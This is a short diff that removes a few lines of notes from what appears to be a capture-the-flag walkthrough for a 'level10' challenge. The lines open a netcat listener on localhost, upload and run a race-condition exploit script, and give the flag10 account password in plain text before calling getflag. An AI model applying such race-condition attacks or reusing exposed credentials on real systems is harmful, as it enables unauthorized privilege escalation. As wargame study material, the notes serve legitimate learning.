@@ -1,8 +1,0 @@
-x. `./connect level09 nc -lk 127.0.0.1 6969`
-
-x. `./send level10 ./level10/Ressources/race`
-
-x. `./connect level09 ./race`
-
-x. `su flag10` - pass: woupa2yuojeeaaed06riuj63c
-   getflag
